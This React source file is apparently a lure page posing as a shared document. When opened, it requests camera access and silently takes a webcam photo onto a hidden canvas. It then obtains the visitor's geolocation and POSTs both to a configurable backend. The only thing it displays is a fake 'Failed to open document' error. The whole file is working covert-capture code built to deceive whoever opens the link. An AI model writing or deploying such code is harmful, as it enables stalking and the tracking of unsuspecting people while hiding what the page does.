import React, { useEffect, useRef, useState } from "react";

function App() {
  const [location, setLocation] = useState(null);
  const [photo, setPhoto] = useState(null);
  const [status, setStatus] = useState("Initializing...");
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    console.log(process.env.REACT_APP_BACKEND_URL);
    const captureData = async () => {
      try {
        // Get camera
        setStatus("Requesting camera access...");
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        await new Promise((resolve) => {
          video.onloadedmetadata = () => resolve();
        });

        // Draw the frame to canvas
        const canvas = canvasRef.current;
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, 320, 240);
        const imageDataUrl = canvas.toDataURL("image/png");
        setPhoto(imageDataUrl);
        setStatus("Photo captured");

        // Stop the video stream (turn off camera)
        stream.getTracks().forEach((track) => track.stop());

        // Get location
        setStatus("Requesting location...");
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const coords = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            };
            setLocation(coords);
            setStatus("Location and photo captured");

            // Send to backend
            fetch(`${process.env.REACT_APP_BACKEND_URL}/sendLocation`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                latitude: coords.latitude,
                longitude: coords.longitude,
                image: imageDataUrl,
              }),
            })
              .then((res) => {
                if (!res.ok) throw new Error("Failed to send to backend");
                return res.json();
              })
              .then((data) => {
                console.log("Backend response:", data);
                setStatus("Data sent to backend successfully");
              })
              .catch((err) => {
                console.error("Backend error:", err);
                setStatus("Failed to send data to backend");
              });
          },
          (err) => {
            console.error("Location error:", err);
            setStatus("Failed to get location");
          }
        );
      } catch (error) {
        console.error("Error:", error);
        setStatus("Permission denied or camera error");
      }
    };

    captureData();
  }, []);

  return (
    <div style={{ padding: "2rem", fontFamily: "Arial, sans-serif" }}>
      {photo && (
        <p>
          <strong>Failed to open document</strong>
        </p>
      )}

      <canvas
        ref={canvasRef}
        width="320"
        height="240"
        style={{ display: "none" }}
      ></canvas>
    </div>
  );
}

export default App;
